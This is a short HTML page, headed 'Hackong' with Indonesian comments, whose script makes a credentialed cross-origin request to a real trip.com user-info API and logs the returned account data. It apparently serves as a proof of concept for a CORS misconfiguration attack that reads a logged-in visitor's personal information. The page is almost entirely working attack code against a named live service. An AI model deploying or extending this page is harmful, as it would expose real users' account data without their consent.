<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
</head>
<body>
   <h1>Hackong</h1>
   <script>
      // 1. Inisialisasi objek XMLHttpRequest
const xhr = new XMLHttpRequest();

// 2. Tentukan metode HTTP dan URL tujuan
const url = 'https://id.trip.com/restapi/soa2/27024/getUserInfo';
xhr.open('POST', url, true); // Ubah 'POST' menjadi 'GET' jika API tersebut menggunakan GET

// 3. Aktifkan credential (cookie, otorisasi TLS, atau sertifikat)
xhr.withCredentials = true;

// 4. Atur Header (opsional, sesuaikan dengan kebutuhan API)
xhr.setRequestHeader('Content-Type', 'application/json');

// 5. Atur fungsi callback saat respons selesai dimuat
xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
        // Berhasil mendapatkan respons
        console.log('Sukses:', JSON.parse(xhr.responseText));
    } else {
        // Server merespons dengan kode error (misal: 404, 500)
        console.error('Gagal. Status:', xhr.status, xhr.statusText);
    }
};

// 6. Atur fungsi callback jika terjadi error jaringan
xhr.onerror = function () {
    console.error('Terjadi kesalahan jaringan.');
};

// 7. Kirim permintaan (tambahkan bodi data di dalam send() jika menggunakan POST)
const data = JSON.stringify({}); 
xhr.send(data);

   </script>
</body>
</html>
